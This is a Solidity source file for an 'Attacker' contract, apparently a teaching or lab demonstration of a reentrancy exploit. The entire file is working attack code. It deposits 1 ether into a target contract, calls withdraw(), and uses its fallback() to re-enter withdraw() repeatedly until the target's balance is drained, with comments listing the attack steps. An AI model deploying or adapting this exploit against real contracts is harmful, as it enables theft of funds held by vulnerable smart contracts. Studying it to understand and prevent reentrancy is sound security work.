pragma solidity 0.8.17;


interface IReentrancy {
    function deposit() external payable;
    function withdraw() external;

}

contract Attacker {

// 1) First attacker has to deposit some amount
// 2) because there is a require check whether the attacker has any balance
// 3) Then call the attack function
// 4) attack function will execute and then fallback() function is called
    IReentrancy reentrancy;
    uint256 amount = msg.value;

    constructor(address _reentrancyAddress) public payable {
        reentrancy=IReentrancy(_reentrancyAddress);

    }

    fallback() external payable{
        if(address(reentrancy).balance >= 1 ether){
            reentrancy.withdraw();
        }


    }

    function attack() public  payable{
        reentrancy.deposit{value:1 ether}();
        reentrancy.withdraw();

    }

    function balanceOfAttackerAddress() public view returns(uint256){
        return address(msg.sender).balance;
    }
    

    function contractbalance() public view returns(uint256){
        return address(this).balance;
    }
}
